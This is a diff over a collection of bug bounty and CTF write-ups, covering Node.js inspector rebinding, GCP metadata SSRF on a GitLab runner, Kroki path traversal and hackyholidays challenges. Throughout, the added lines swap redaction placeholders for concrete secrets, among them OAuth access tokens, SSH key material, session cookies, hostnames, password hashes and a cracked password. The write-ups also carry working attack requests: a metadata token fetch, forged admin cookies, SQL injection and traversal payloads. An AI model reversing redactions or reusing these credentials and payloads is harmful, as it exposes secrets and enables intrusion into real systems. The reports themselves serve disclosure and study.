-Vulnerable code segment: https://github.com/nodejs/node/blob/[REDACTED_SECRET]/src/inspector_socket.cc#L164-L183
+Vulnerable code segment: https://github.com/nodejs/node/blob/d9b71f4c241fa31cc2a48331a4fc28c15937875a/src/inspector_socket.cc#L164-L183
 
 ### DNS Setup
 
@@ -4426,12 +4426,12 @@ Subsequently `<Computer Name>.local` can be rebinded to `127.0.0.1`, causing the
 
 [According to IANA](https://www.iana.org/assignments/iana-ipv4-special-registry/iana-ipv4-special-registry.xhtml), `0.0.0.0/8` is a reserved address range. To prevent this vulnerability, this address range could be blocked.
 
-A way to check for this address range could simply be `accum == 0` in the first octet or `host.front() == '0'` in [IsIPAddress](https://github.com/nodejs/node/blob/[REDACTED_SECRET]/src/inspector_socket.cc#L164-L183)
+A way to check for this address range could simply be `accum == 0` in the first octet or `host.front() == '0'` in [IsIPAddress](https://github.com/nodejs/node/blob/d9b71f4c241fa31cc2a48331a4fc28c15937875a/src/inspector_socket.cc#L164-L183)
 
 ## Supporting Material/References:
 
 - Original vulnerability: https://nvd.nist.gov/vuln/detail/CVE-2018-7160
-- Code segment: https://github.com/nodejs/node/blob/[REDACTED_SECRET]/src/inspector_socket.cc#L164-L183
+- Code segment: https://github.com/nodejs/node/blob/d9b71f4c241fa31cc2a48331a4fc28c15937875a/src/inspector_socket.cc#L164-L183
 
 ## Impact
 
@@ -5043,9 +5043,9 @@ Repo: https://gitlab.com/ec0bb/citest
 GCP access (albeit limited) -
 ```
 curl -H 'Metadata-Flavor:Google' http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
-{"access_token":"ya29.c.[REDACTED_SECRET]","expires_in":3326,"token_type":"Bearer"}
+{"access_token":"ya29.c.b0AXv0zTPHcDsuE3JOIVaFex7mGac13DuX3nI8XvoeSTANd0HfWmJ8BaTiE0P8GGRBVjOH3--Bangi4UVHqBpR7hLsfielnvZd5VWsRVM9xedCsFchJ1VlIl_RHRAgndu79QhAdEtquGQ9FVw8K_v-beS5zXMSh2DZNEfrUx6IgkAF3skn2sAkxg89XQm5gm067YQIAoaPlyI","expires_in":3326,"token_type":"Bearer"}
 
-ya29.c.[REDACTED_SECRET]
+ya29.c.b0AXv0zTO_ny6xsfw0m5_YDMjdRUJbxx4jtnhEvrHEBghVmwDPL8GYx8UEQyB2spVmqtEy4IO_1kIONyCny-qwV7bi32okDSc8eNSTwXDUynLVayT3O0OiQ_FOCBlIMaU8Afx_Cbnr3xM7okiaMie0OWkRt4rHnYakWzXUZ_skTaLtN75GASDhs-mqFBe2LPFhj58eGf7DnFNk
 token bb
 
 
@@ -5054,9 +5054,9 @@ token bb
 instance/attributes/cos-update-strategy update_disabled
 instance/attributes/sshKeys cos:ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDHZ9aaQ4+W
 humgGQokzT+0zX+bS6AkSbs/JYeuoV8Sdb2cp88txEWoozuamR/S6MXp0lHF7hD2hmClvk5LESQLo9pe
-FWXu8U1RZnYyN/pgAA3SpiLaWppxaEd5s5Ry/[REDACTED_SECRET]
-zovivE+RA+[REDACTED_SECRET]/nQ6T
-[REDACTED_SECRET]++1kQxVkEUFor
+FWXu8U1RZnYyN/pgAA3SpiLaWppxaEd5s5Ry/EXMLunbShenhpg05aby26wBHnBINU4ERITySAW362xT
+zovivE+RA+yWUcuZUzpGTAGOeSqJpH7Gg4g86jMof7IG0Ybixt6LgRhK8tX6ryUw8eqWaAPwB4W/nQ6T
+n2Eup21246PzVqMMhxo4O1dO2g7e2Jyqehvo7Yf5avc4kQ7h2LBrt033Esk1V5XFdzb++1kQxVkEUFor
 wID4cGmMb0Av cos
 
 instance/attributes/user-data #cloud-config
@@ -5121,7 +5121,7 @@ instance/disks/0/index 0
 instance/disks/0/interface SCSI
 instance/disks/0/mode READ_WRITE
 instance/disks/0/type PERSISTENT
-instance/hostname [REDACTED_SECRET].c.gitlab-ci-plan-fr
+instance/hostname runner-jlguopmm-shared-1641423520-3feb5440.c.gitlab-ci-plan-fr
 ee-6-f2de7a.internal
 instance/id 8450900684160343118
 instance/image projects/gitlab-ci-155816/global/images/runners-cos-stable-v20210
@@ -5133,7 +5133,7 @@ instance/licenses/1/id 1001010
 instance/licenses/2/id 166739712233658766
 instance/machine-type projects/745008255720/machineTypes/n1-standard-1
 instance/maintenance-event NONE
-instance/name [REDACTED_SECRET]
+instance/name runner-jlguopmm-shared-1641423520-3feb5440
 instance/network-interfaces/0/access-configs/0/external-ip 35.185.3.50
 instance/network-interfaces/0/access-configs/0/type ONE_TO_ONE_NAT
 instance/network-interfaces/0/dns-servers 169.254.169.254
@@ -5181,9 +5181,9 @@ https://www.googleapis.com/auth/monitoring.write
 
 docker access
 ```
-root@[REDACTED_SECRET] /etc # docker ps
+root@runner-jlguopmm-shared-1641423520-3feb5440 /etc # docker ps
 CONTAINER ID        IMAGE                                                      COMMAND                  CREATED             STATUS              PORTS               NAMES
-a40074c0d2c5        a5d7930b60cc                                               "sh -c 'if [ -x /usr…"   25 minutes ago      Up 25 minutes                           [REDACTED_SECRET]
+a40074c0d2c5        a5d7930b60cc                                               "sh -c 'if [ -x /usr…"   25 minutes ago      Up 25 minutes                           runner-jlguopmm-project-27556964-concurrent-0-1abba63760b4a3af-build-2
 8c1dbc222094        quay.io/gitlab/gitlab-runner-docker-cleanup:latest         "go-wrapper run"         5 months ago        Up 26 minutes                           gitlab-runner-docker-cleanup
 fa185f65bc99        registry.gitlab.com/gitlab-org/ci-cd/suricata-runner:0.3   "/sbin/init"             5 months ago        Up 26 minutes                           suricata
 17e19eb0ac0b        quay.io/prometheus/node-exporter:v1.0.1                    "/bin/node_exporter …"   5 months ago        Up 26 minutes                           node-exporter
@@ -5191,7 +5191,7 @@ fa185f65bc99        registry.gitlab.com/gitlab-org/ci-cd/suricata-runner:0.3   "
 
 runner TLS keys for communicating with the runner manager (also used for logstash auth)
 ```
-root@[REDACTED_SECRET] /etc # file /mnt/stateful_partition/assets/ssl/*
+root@runner-jlguopmm-shared-1641423520-3feb5440 /etc # file /mnt/stateful_partition/assets/ssl/*
 runner.ca.crt:     PEM certificate
 runner.client.crt: PEM certificate
 runner.client.key: PEM RSA private key
@@ -5351,7 +5351,7 @@ Information Disclosure
 Web Application
 
 ## Suggested Mitigation/Remediation Actions
-https://www.owasp.org/index.php/[REDACTED_SECRET]
+https://www.owasp.org/index.php/Insecure_Direct_Object_Reference_Prevention_Cheat_Sheet
 
 ## Impact
 
@@ -5681,10 +5681,10 @@ Set-Cookie: JSESSIONID=fceoa3cccho3q5dc6ahec3ghav; path=/; HttpOnly
 Set-Cookie: ███; Path=/; HttpOnly; Secure
 X-Vcap-Request-Id: ffb083d0-f29b-4623-5249-9f015b9cc59f
 Strict-Transport-Security: max-age=31536000; includeSubDomains
-Set-Cookie: TS01b8cd54=[REDACTED_SECRET]; Path=/; Domain=.█████████
+Set-Cookie: TS01b8cd54=01dc86b24807c4064ee7333f073dd2db329d550bf5a80b061306a56af136c21560cefb7fa74dbd19a258797185afd48dfdfb9f2dca; Path=/; Domain=.█████████
 Content-Length: 173
 
-<br>Upload SUCCESS!<br>S3 ObjectURL: https://[REDACTED_SECRET].s3.amazonaws.com/██████████/███████SiteContent/█████████████.zip<br>error in █████ table 
+<br>Upload SUCCESS!<br>S3 ObjectURL: https://pcf-om-mil-86e7ccdd-b099-4b50-aad2-cad52466327b.s3.amazonaws.com/██████████/███████SiteContent/█████████████.zip<br>error in █████ table 
 ```
 
 This uploaded file can be downloaded again on https://█████████.██████████/████/███/███.php (another system) by clicking on the "██████████ ███████" link: https://██████.█████████/█████████/██████████/downloadS3File.php?file=███%2F██████SiteContent%2F███████.zip
@@ -5925,7 +5925,7 @@ Set-Cookie: JSESSIONID=0g33q2a5b6hkj02pv9hro94dqa; path=/; HttpOnly
 Set-Cookie: __VCAP_ID__=7aa1d3ae-4d04-4a15-6476-fac8; Path=/; HttpOnly; Secure
 X-Vcap-Request-Id: c7bd3c85-075f-43d3-4a45-7f494a6cc748
 Strict-Transport-Security: max-age=31536000; includeSubDomains
-Set-Cookie: TS01485890=[REDACTED_SECRET]; Path=/
+Set-Cookie: TS01485890=01d8bb34a4a839126a96d80bd04820274929fd7bd07f6a640cdcbc306946f3965158fe2cdee1ce628fee6943b7320cf7b62b158749; Path=/
 Content-Length: 337
 
 <br> path is /███████<br> get outtest.txt<br>S3 keyname: ██████████p/█████████test.txt<br>i = 0, Upload SUCCESS!<br>S3 ObjectURL: https://███████/████p/███████████████test.txt<br>error in ██████charts table 
@@ -6264,7 +6264,7 @@ By adding "X-Forwarded-For: 127.0.0.1" as a header while requesting a certain pa
 
 So, let me start with saying I'm not sure if this is a security issue or if it is by design. The reason I'm reporting it here is since Nextcloud promotes this Virtual Data Room a lot.
 
-https://nextcloud.com/blog/[REDACTED_SECRET]/
+https://nextcloud.com/blog/nextcloud-announces-virtual-data-room-solution-for-ultimate-protection-of-data-during-sensitive-dealmaking/
 https://nextcloud.com/virtual-data-room/
 
 And let me just quote: "configure Secure View ensure the users can still read and (when shared with editing rights) modify documents, while the documents are watermarked when on screen."
@@ -6451,7 +6451,7 @@ Sec-Fetch-Mode: cors
 Sec-Fetch-Dest: empty
 Accept-Encoding: gzip, deflate, br
 Accept-Language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,cs;q=0.6
-Cookie: aura=u2FOcME6PSlT; admin_phusr=amer17; admin_phsid=[REDACTED_SECRET]; halo=9LIv4U24kVpa
+Cookie: aura=u2FOcME6PSlT; admin_phusr=amer17; admin_phsid=ld7bdwzjadvg5x3go3wykgzj3blk3qrdidlqd452; halo=9LIv4U24kVpa
 
 __csrf__=B%402hmxctpgc672d004d5b2cc5c&__form__=1&__dialog__=1&new=true&email=asuuu17%40gmail.com&__submit__=true&__wflow__=true&__ajax__=true&__metablock__=3
 
@@ -6581,7 +6581,7 @@ Date: Wed, 04 Nov 2020 18:18:46 GMT
 Content-Length: 565
 Set-Cookie: BIGipServer██████████████ path=/; Httponly; Secure
 
-<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema"><soap:Body><GetAccessAdministratorResponse xmlns="http://questionmark.com/QMWISe/"><URL>https://█████████/em5/exlogin.asp?CustomerID=AuthoringRepository&amp;USER=au_eliut&amp;EXPIRY=04:11:2020:13:18&amp;CHECKSUM=[REDACTED_SECRET]</URL></GetAccessAdministratorResponse></soap:Body></soap:Envelope>
+<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema"><soap:Body><GetAccessAdministratorResponse xmlns="http://questionmark.com/QMWISe/"><URL>https://█████████/em5/exlogin.asp?CustomerID=AuthoringRepository&amp;USER=au_eliut&amp;EXPIRY=04:11:2020:13:18&amp;CHECKSUM=db69772f40b1a71179fd96e1bceebed003f3049e03a78e7d009c4627d387da2c</URL></GetAccessAdministratorResponse></soap:Body></soap:Envelope>
 
 ```
 ██████████
@@ -6818,7 +6818,7 @@ require 'base64'
 require 'zlib'
 
 
-test = "[REDACTED_SECRET]=="
+test = "eNpLzkksLlZwyslPzg4oyk9OLS7OL-JKBgu6ZCamFyXmguXgQiWJicgCATmJeSWhuTkQMS5UcxRsanR1FTJSM1K5kM2CCCMZhSmJYiwAy8U5sQ=="
 p Zlib::Inflate.inflate(Base64.urlsafe_decode64(test))
 ```
 
@@ -6866,7 +6866,7 @@ class S(BaseHTTPRequestHandler):
     def do_GET(self):
         logging.info("GET request,\nPath: %s\nHeaders:\n%s\n", str(self.path), str(self.headers))
         self._set_response()
-        self.wfile.write(b"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDEY+UcYlP8VzOBdyMGUpbVFMsAUxPjWK7OiqARu/t3wO1mSNJ/RE5eaNLz5+6zM2WllUVrYF3cDXqNxge4srScM/[REDACTED_SECRET]+GMM/iN+mu4FtQ+ckMfOA8T/[REDACTED_SECRET]+TJwAMpVa3L+Lbx4TZd04Fl5uKmCYUfPfBvj1/[REDACTED_SECRET]+g21VLba5OASXU/ZsedRmzECefMu8RVKHPzaaiC+RQU+1ihgBnQig0MdaXz8PZLOCo/673Pg9nsqjNafeU7fGTJD95BkkDL/3OfIEBq+rMbOyxrU+k8H+QWeVCbvh2LWRxdy/xciOMkkdodm2eGg45kJNjoDeKJEp0YpQ9ha+PdsqQqENAbqFqmYheAy1KJcpbG+U6Uik4hVXHxTAu0= ledz@ledzs-MacBook-Pro.local")
+        self.wfile.write(b"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDEY+UcYlP8VzOBdyMGUpbVFMsAUxPjWK7OiqARu/t3wO1mSNJ/RE5eaNLz5+6zM2WllUVrYF3cDXqNxge4srScM/v887Lz8mAupAZoPunxHrSTWFHjbCBaGm80z8QyStG+GMM/iN+mu4FtQ+ckMfOA8T/9k3clK3HomQXunJe85a6MPDsgE5MvEm4MdBUKQpEaEbstmAWtQIR5KCMHyNDa9WVKQQI+TJwAMpVa3L+Lbx4TZd04Fl5uKmCYUfPfBvj1/209s1XDN2rAK3AKJjAEbPVuLcZrl9iAse0FgA6HvUtA+g21VLba5OASXU/ZsedRmzECefMu8RVKHPzaaiC+RQU+1ihgBnQig0MdaXz8PZLOCo/673Pg9nsqjNafeU7fGTJD95BkkDL/3OfIEBq+rMbOyxrU+k8H+QWeVCbvh2LWRxdy/xciOMkkdodm2eGg45kJNjoDeKJEp0YpQ9ha+PdsqQqENAbqFqmYheAy1KJcpbG+U6Uik4hVXHxTAu0= ledz@ledzs-MacBook-Pro.local")
 
     def do_POST(self):
         content_length = int(self.headers['Content-Length']) # <--- Gets the size of data
@@ -6905,7 +6905,7 @@ require 'digest'
 require 'base64'
 require 'zlib'
 
-string = "http://192.168.69.1:8082/plantuml/../../../../../../tmp/test_file_write.txt/[REDACTED_SECRET]=="
+string = "http://192.168.69.1:8082/plantuml/../../../../../../tmp/test_file_write.txt/eNpLzkksLlZwyslPzg4oyk9OLS7OL-JKBgu6ZCamFyXmguXgQiWJicgCATmJeSWhuTkQMS5UcxRsanR1FTJSM1K5kM2CCCMZhSmJYiwAy8U5sQ=="
 
 p "diag-#{Digest::SHA256.hexdigest test = string}"
 ```
@@ -6914,7 +6914,7 @@ p "diag-#{Digest::SHA256.hexdigest test = string}"
 
 ```
 [#goals]
-:imagesdir: diag-[REDACTED_SECRET].
+:imagesdir: diag-58f90331904a1989259d639c5677e0fff5e434e739c70f1d3bb2004723bc99b8.
 :outdir: /tmp/
 
 [plantuml, test="{counter:kroki-fetch-diagram:true}",tet="{counter:kroki-server-url:http://192.168.69.1:8082/}", format="/../../../../../../tmp/test_file_write.txt"]
@@ -6936,7 +6936,7 @@ Save then render
 
 ```
 [#goals]
-:imagesdir: diag-[REDACTED_SECRET].
+:imagesdir: diag-58f90331904a1989259d639c5677e0fff5e434e739c70f1d3bb2004723bc99b8.
 :outdir: /tmp/
 
 [plantuml, test="{counter:kroki-fetch-diagram:true}",tet="{counter:kroki-server-url:http://192.168.69.1:8082/}", format="/../../../../../../tmp/test_file_write.txt"]
@@ -7275,7 +7275,7 @@ Resources:
 
 The only article i can find pertaining to this type of vulnerability
 
-https://cheatsheetseries.owasp.org/cheatsheets/[REDACTED_SECRET].html
+https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html
 
 ## Impact
 
@@ -7375,7 +7375,7 @@ I am using this docker image (no modifications): https://github.com/nextcloud/do
 
 Reasoning why localhost6 is not so common and Node.js should not rely on its presence in the hosts file:
 
-* It is not even present in the node:latest Docker image (sha256:[REDACTED_SECRET])
+* It is not even present in the node:latest Docker image (sha256:aa1930b56896a43dedb227526d5d40f4a6e9157f9d8703f9584650cde510438a)
 * I haven't seen it in Windows 10.
 * Unlike RFC 6761 for localhost, I have found no RFC that mentions localhost6 (see https://www.google.com/search?q=localhost6+site%3Atools.ietf.org ).
 
@@ -7393,7 +7393,7 @@ Preconditions: Victim has no entry for localhost6 in hosts and attacker controls
   8. The http://localhost6:9229 website (i.e., the one hosted on <attacker's IP>) will retrieve http://localhost6:9229/json from 127.0.0.1, including webSocketDebuggerUrl.
   9. Now, the attacker knows the webSocketDebuggerUrl and can connect to is using WebSocket. Note that WebSocket is not restricted by same-origin-policy. By doing so, they can gain the privileges of the Node.js instance.
 
-Vulnerable code: https://github.com/nodejs/node/blob/[REDACTED_SECRET]/src/inspector_socket.cc#L584
+Vulnerable code: https://github.com/nodejs/node/blob/fdf0a84e826d3a9ec0ce6f5a3f5adc967fe99408/src/inspector_socket.cc#L584
 
 ## Impact:
 
@@ -7402,7 +7402,7 @@ Attacker can gain access to the Node.js debugger, which can result in remote cod
 ## Supporting Material/References:
 
   * Original vulnerability: https://nvd.nist.gov/vuln/detail/CVE-2018-7160
-  * Vulnerable code: https://github.com/nodejs/node/blob/[REDACTED_SECRET]/src/inspector_socket.cc#L584
+  * Vulnerable code: https://github.com/nodejs/node/blob/fdf0a84e826d3a9ec0ce6f5a3f5adc967fe99408/src/inspector_socket.cc#L584
   * Documentation that mentions the vulnerable behavior: https://nodejs.org/en/docs/guides/debugging-getting-started/
 
 ## Impact
@@ -7813,7 +7813,7 @@ Content-Length: 33
 
 + As  every request triggered after /api endpoint, so I did the brute force the /api path using the best wordlist which I came across with:
 
- https://gist.github.com/yassineaboukir/[REDACTED_SECRET] which was created by Yassine Aboukir. 
+ https://gist.github.com/yassineaboukir/8e12adefbd505ef704674ad6ad48743d which was created by Yassine Aboukir. 
 
 + I used the tool "FFUF" to fuzz the API endpoint with responses such as 200,400,403,401,502.
 
@@ -7837,14 +7837,14 @@ user                    [Status: 400, Size: 35, Words: 3, Lines: 1]
 ```json
 {
 "sessions": [
-"[REDACTED_SECRET]=",
-"[REDACTED_SECRET]=",
-"[REDACTED_SECRET]==",
-"[REDACTED_SECRET]=",
-"[REDACTED_SECRET]=",
-"[REDACTED_SECRET]=",
-"[REDACTED_SECRET]=",
-"[REDACTED_SECRET]="
+"[REDACTED_SESSION_COOKIE]",
+"[REDACTED_SESSION_COOKIE]",
+"eyJ1c2VyIjoiQzdEQ0NFLTBFMERBQi1CMjAyMjYtRkM5MkVBLTFCOTA0MyIsImNvb2tpZSI6Ik5EVTBPREk1TW1ZM1pEWTJNalJpTVdFME1tWTNOR1F4TVdFME9ETXhNemcyTUdFMVlXUmhNVGMwWWpoa1lXRTNNelUxTWpaak5EZzVNRFEyWTJKaFlqWTNZVEZoWTJRM1lqQm1ZVGs0TjJRNVpXUTVNV1E1T1dGa05XRTJNakl5Wm1aak16WmpNRFEzT0RrNVptSTRaalpqT1dVME9HSmhNakl3Tm1Wa01UWT0ifQ==",
+"[REDACTED_SESSION_COOKIE]",
+"[REDACTED_SESSION_COOKIE]",
+"[REDACTED_SESSION_COOKIE]",
+"[REDACTED_SESSION_COOKIE]",
+"[REDACTED_SESSION_COOKIE]"
 ]
 }
 ```
@@ -7854,11 +7854,11 @@ user                    [Status: 400, Size: 35, Words: 3, Lines: 1]
 ```
 3rd session - 
 
-[REDACTED_SECRET]==
+eyJ1c2VyIjoiQzdEQ0NFLTBFMERBQi1CMjAyMjYtRkM5MkVBLTFCOTA0MyIsImNvb2tpZSI6Ik5EVTBPREk1TW1ZM1pEWTJNalJpTVdFME1tWTNOR1F4TVdFME9ETXhNemcyTUdFMVlXUmhNVGMwWWpoa1lXRTNNelUxTWpaak5EZzVNRFEyWTJKaFlqWTNZVEZoWTJRM1lqQm1ZVGs0TjJRNVpXUTVNV1E1T1dGa05XRTJNakl5Wm1aak16WmpNRFEzT0RrNVptSTRaalpqT1dVME9HSmhNakl3Tm1Wa01UWT0ifQ==
 
 base64 decoded - 
 
-{"user":"C7DCCE-0E0DAB-B20226-FC92EA-1B9043","cookie":"[REDACTED_SECRET]="}
+{"user":"C7DCCE-0E0DAB-B20226-FC92EA-1B9043","cookie":"NDU0ODI5MmY3ZDY2MjRiMWE0MmY3NGQxMWE0ODMxMzg2MGE1YWRhMTc0YjhkYWE3MzU1MjZjNDg5MDQ2Y2JhYjY3YTFhY2Q3YjBmYTk4N2Q5ZWQ5MWQ5OWFkNWE2MjIyZmZjMzZjMDQ3ODk5ZmI4ZjZjOWU0OGJhMjIwNmVkMTY="}
 ```
 
 + From here, I got user-id as C7DCCE-0E0DAB-B20226-FC92EA-1B9043 and cookie value.
@@ -7990,7 +7990,7 @@ Server: nginx/1.18.0 (Ubuntu)
 Date: Thu, 31 Dec 2020 10:33:46 GMT
 Content-Type: text/html; charset=UTF-8
 Connection: keep-alive
-Set-Cookie: securelogin=[REDACTED_SECRET]%3D; expires=Thu, 31-Dec-2020 11:33:46 GMT; Max-Age=3600; path=/secure-login
+Set-Cookie: securelogin=eyJjb29raWUiOiIxYjVlNWYyYzlkNThhMzBhZjRlMTZhNzFhNDVkMDE3MiIsImFkbWluIjpmYWxzZX0%3D; expires=Thu, 31-Dec-2020 11:33:46 GMT; Max-Age=3600; path=/secure-login
 Location: /secure-login
 ```
 
@@ -8004,12 +8004,12 @@ Location: /secure-login
 + First thing I checked to use inspect the element and check if there is a disabled href link or not, however, no luck.
 + Next thing I saw there was a cookie parameter in the response which was base64 encrypted.
 
-`[REDACTED_SECRET]=`
+`eyJjb29raWUiOiIxYjVlNWYyYzlkNThhMzBhZjRlMTZhNzFhNDVkMDE3MiIsImFkbWluIjpmYWxzZX0=`
 
-+ Decoded the base64 parameter and cookie value was `{"cookie":"[REDACTED_SECRET]","admin":false}`. I changed the "admin":"false" to "admin":"true" and next thing, again encoded the cookie parameter.
++ Decoded the base64 parameter and cookie value was `{"cookie":"1b5e5f2c9d58a30af4e16a71a45d0172","admin":false}`. I changed the "admin":"false" to "admin":"true" and next thing, again encoded the cookie parameter.
 
 ```
-{"cookie":"[REDACTED_SECRET]","admin":true} -> base64 encode -> [REDACTED_SECRET]==
+{"cookie":"1b5e5f2c9d58a30af4e16a71a45d0172","admin":true} -> base64 encode -> eyJjb29raWUiOiIxYjVlNWYyYzlkNThhMzBhZjRlMTZhNzFhNDVkMDE3MiIsImFkbWluIjp0cnVlfQ==
 ```
 
 + In my chrome browser, I already got the "edit this cookie" extension and I changed with the above newly base64 encoded cookie parameter.
@@ -8360,7 +8360,7 @@ Grinch-Networks/forum 1 commit
 + Analyzed every files, however couln't find anything interesting. Next up, I started to look at commits area - "https://github.com/Grinch-Networks/forum/commits/main", and thus on the second commit as "small fix", it was leaking the username and password for the database.
 
 **Request**
-https://github.com/Grinch-Networks/forum/commit/[REDACTED_SECRET]
+https://github.com/Grinch-Networks/forum/commit/efb92ef3f561a957caad68fca2d6f8466c4d04ae
 
 **Response**
 
@@ -8390,7 +8390,7 @@ https://github.com/Grinch-Networks/forum/commit/[REDACTED_SECRET]
 `username - forum, password - 6HgeAZ0qC9T6CQIqJpD`.
 
 + Next up , as we got the database username and password, first I try to logged into /forum/login, but it was incorrect, next up idea was to bruteforce.
-+ In bruteforce, I've used the wordlist as -  https://github.com/danielmiessler/SecLists/blob/[REDACTED_SECRET]/Discovery/Web-Content/api/objects.txt.
++ In bruteforce, I've used the wordlist as -  https://github.com/danielmiessler/SecLists/blob/d5271820d00935387bdff87d0a79ae5513b47ce3/Discovery/Web-Content/api/objects.txt.
 
 + Executed the command using ffuf tool - `./ffuf -w /Users/kunalpandey/Desktop/objects.txt -u "https://hackyholidays.h1ctf.com/forum/FUZZ" `
 
@@ -8416,13 +8416,13 @@ https://hackyholidays.h1ctf.com/forum/phpmyadmin?db=forum&table=user
 
 ```
 id	username	password	admin
-1	grinch	[REDACTED_SECRET]	1
-2	max	[REDACTED_SECRET]	
+1	grinch	35D652126CA1706B59DB02C93E0C9FBF	1
+2	max	388E015BC43980947FCE0E5DB16481D1	
 ```
 
 + In the column "admin", it was 1 for username grinch and thus we can say that grinch is an admin. However , password was encrypted. Now, to crack the password, one of the best site can be used over here is https://crackstation.net.
 
-+ In this site, entered the encrypted hash as [REDACTED_SECRET].
++ In this site, entered the encrypted hash as 35D652126CA1706B59DB02C93E0C9FBF.
 
 {F1139505}
 
@@ -8430,7 +8430,7 @@ id	username	password	admin
 
 ```
 Hash	Type	Result
-[REDACTED_SECRET]	md5	BahHumbug
+35D652126CA1706B59DB02C93E0C9FBF	md5	BahHumbug
 ```
 
 + So, for username - grinch, password is BahHumbug. Using this credentials, logged in successfully on the page `https://hackyholidays.h1ctf.com/forum/login` and visited the secret plans forum page.
@@ -8494,7 +8494,7 @@ Sec-Fetch-Dest: document
 Referer: https://hackyholidays.h1ctf.com/evil-quiz
 Accept-Encoding: gzip, deflate
 Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
-Cookie: session=[REDACTED_SECRET]
+Cookie: session=7ef26002a6768edc128fa085f2097475
 
 name=%22+or+sleep%285%29
 ```
@@ -8523,7 +8523,7 @@ Sec-Fetch-Dest: document
 Referer: https://hackyholidays.h1ctf.com/evil-quiz/start
 Accept-Encoding: gzip, deflate
 Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
-Cookie: session=[REDACTED_SECRET]
+Cookie: session=7ef26002a6768edc128fa085f2097475
 
 ques_1=0&ques_2=0&ques_3=0
 ```
@@ -8566,7 +8566,7 @@ Sec-Fetch-Dest: document
 Referer: https://hackyholidays.h1ctf.com/evil-quiz
 Accept-Encoding: gzip, deflate
 Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
-Cookie: session=[REDACTED_SECRET]
+Cookie: session=7ef26002a6768edc128fa085f2097475
 
 name=%22+or+sleep%285%29
 ```
@@ -8969,7 +8969,7 @@ Server: nginx/1.18.0 (Ubuntu)
 Date: Thu, 31 Dec 2020 14:51:29 GMT
 Content-Type: text/html; charset=UTF-8
 Connection: close
-Set-Cookie: token=[REDACTED_SECRET]; expires=Thu, 31-Dec-2020 15:51:29 GMT; Max-Age=3600
+Set-Cookie: token=16e3f0dd617d5ce9dbdba2c5a1f11b2d; expires=Thu, 31-Dec-2020 15:51:29 GMT; Max-Age=3600
 Location: /signup-manager/
 Content-Length: 0
 ```
@@ -9030,22 +9030,22 @@ HTTP Status Code	Explanation
 
 Image was loaded with base64 encoded parameter:
 
-https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/picture?data=[REDACTED_SECRET]
+https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLzMyZmViYjE5NTcyYjEyNDM1YTZhMzkwYzA4ZThkM2RhLmpwZyIsImF1dGgiOiI3NmJhMDYxZDM1NmM2MjY0YTYwMDUyMTZlMTc3NmJhNiJ9
 
 {F1139675}
 
 
 + Decoding the base64 parameter gives the output as:
 
-{"image":"r3c0n_server_4fdk59\/uploads\/[REDACTED_SECRET].jpg","auth":"[REDACTED_SECRET]"}
+{"image":"r3c0n_server_4fdk59\/uploads\/32febb19572b12435a6a390c08e8d3da.jpg","auth":"76ba061d356c6264a6005216e1776ba6"}
 
 + So, I thought to insert api path for ssrf exploit inside the image , so tried the payload as:
 
 ```
-{"image":"r3c0n_server_4fdk59\/uploads\/..\/api/","auth":"[REDACTED_SECRET]"} --> encoded base64 parameter --->[REDACTED_SECRET]=
+{"image":"r3c0n_server_4fdk59\/uploads\/..\/api/","auth":"76ba061d356c6264a6005216e1776ba6"} --> encoded base64 parameter --->eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLy4uXC9hcGkvIiwiYXV0aCI6Ijc2YmEwNjFkMzU2YzYyNjRhNjAwNTIxNmUxNzc2YmE2In0=
 ```
 
-And visited -  https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/picture?data=[REDACTED_SECRET]=
+And visited -  https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLy4uXC9hcGkvIiwiYXV0aCI6Ijc2YmEwNjFkMzU2YzYyNjRhNjAwNTIxNmUxNzc2YmE2In0=
 
 **Response**
 
@@ -9083,16 +9083,16 @@ https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=-6860%27%20UNION%
 
 ```html
  <div class="col-md-4">
-                        <img class="img-responsive" src="/r3c0n_server_4fdk59/picture?data=[REDACTED_SECRET]">
+                        <img class="img-responsive" src="/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLy4uXC9hcGlcLyIsImF1dGgiOiIwNWE3ZTcwOGE1ZjNkYTc2NTA2MDIzMDQ3NjI4ODI5ZCJ9">
                     </div>
 ```
 **Request**
 
-https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/picture?data=[REDACTED_SECRET]
+https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLy4uXC9hcGlcLyIsImF1dGgiOiIwNWE3ZTcwOGE1ZjNkYTc2NTA2MDIzMDQ3NjI4ODI5ZCJ9
 
 Base64decoded
 
-`{"image":"r3c0n_server_4fdk59\/uploads\/..\/api\/","auth":"[REDACTED_SECRET]"}`
+`{"image":"r3c0n_server_4fdk59\/uploads\/..\/api\/","auth":"05a7e708a5f3da76506023047628829d"}`
 
 **Response**
 
@@ -9180,27 +9180,27 @@ flag{07a03135-9778-4dee-a83c-7ec330728e72}
 
 **Request**
